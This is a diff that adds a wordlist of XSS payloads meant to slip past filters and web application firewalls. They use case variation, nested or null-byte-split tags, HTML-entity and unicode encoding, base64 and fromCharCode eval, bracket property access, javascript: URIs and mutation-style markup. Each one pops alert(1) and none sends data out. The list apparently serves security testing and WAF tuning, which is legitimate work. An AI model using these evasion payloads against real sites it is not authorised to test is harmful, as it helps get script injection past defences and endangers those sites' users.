@@ -1,0 +1,35 @@
+# XSS - Filter/WAF Bypass Payloads
+# Techniques to bypass common XSS filters and WAFs
+# Case variation, encoding, obfuscation, alternative syntax
+<ScRiPt>alert(1)</ScRiPt>
+<sCrIpT>alert(1)</sCrIpT>
+<SCRIPT>alert(1)</SCRIPT>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<img src=x onerror=alert`1`>
+<svg onload=alert`1`>
+<img src=x onerror=alert&lpar;1&rpar;>
+<svg/onload=alert(1)>
+<svg	onload=alert(1)>
+<svg
+onload=alert(1)>
+<img src=x onerror=alert(1)>
+<img src=x onerror=\u{61}lert(1)>
+<img src=x onerror=alert(1)>
+<img src=x onerror=&#97;lert(1)>
+<img src=x onerror=&#x61;lert(1)>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<img src=x onerror=top['al'+'ert'](1)>
+<img src=x onerror=window['alert'](1)>
+<img src=x onerror=self['alert'](1)>
+<svg onload="javascript:alert(1)">
+<img src=x:alert onerror=eval(src)>
+<img src="jav	ascript:alert(1)">
+<a href=javas&#99;ript:alert(1)>click</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
+%3Cscript%3Ealert(1)%3C/script%3E
+<img src=x onerror=alert(1)//
+<img src=x onerror="alert(1);"
+<svg><script>alert&#40;1)</script></svg>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
